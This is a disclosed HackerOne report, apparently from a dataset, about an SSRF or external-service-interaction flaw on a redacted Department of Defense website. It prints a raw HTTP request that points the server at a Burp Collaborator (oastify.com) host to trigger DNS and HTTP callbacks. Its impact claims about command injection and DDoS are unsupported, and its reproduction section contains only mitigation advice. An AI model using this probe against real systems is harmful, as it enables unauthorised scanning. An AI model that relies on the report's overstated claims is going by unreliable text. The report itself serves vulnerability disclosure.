---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1704024'
original_report_id: '1704024'
title: External service interaction ( DNS and HTTP ) in www.████████
weakness: Server-Side Request Forgery (SSRF)
team_handle: deptofdefense
created_at: '2022-09-19T00:13:29.525Z'
disclosed_at: '2023-06-23T18:19:31.618Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# External service interaction ( DNS and HTTP ) in www.████████

## Metadata

- HackerOne Report ID: 1704024
- Weakness: Server-Side Request Forgery (SSRF)
- Program: deptofdefense
- Disclosed At: 2023-06-23T18:19:31.618Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

There is External service interaction ( DNS and HTTP ) vulnerability in www.█████████

Here is an example request :
```
GET http://9eoecirvai3o4lsdrpqzvyia71dr1g.oastify.com/ HTTP/1.1
Host: www.██████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.██████/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```
And the Burp Collaborator recived this information :
DNS request recived from : ████████
HTTP request recived from : ███

███
█████████

## Impact

The External Service Interaction arise when it is possible for a attacker to induce application to interact with the arbitrary external service such as DNS HTTP etc.
The External Service Interaction can is not limited to HTTP,HTTPS or DNS, you can lead to FTP, SMTP etc. Such weakness can lead to DDoS attack.
The External Service Interaction can lead to OS Command Injection, DOS Attack, DDOS Attack or Code Manipulation.

## System Host(s)
www.████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Use whitelist check, boundary based validation and sanitization.
Maintain whitelist at network and web front.
Review Source Code for functions such as dns.resolve() , dns.query() , sys_exec() etc.

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
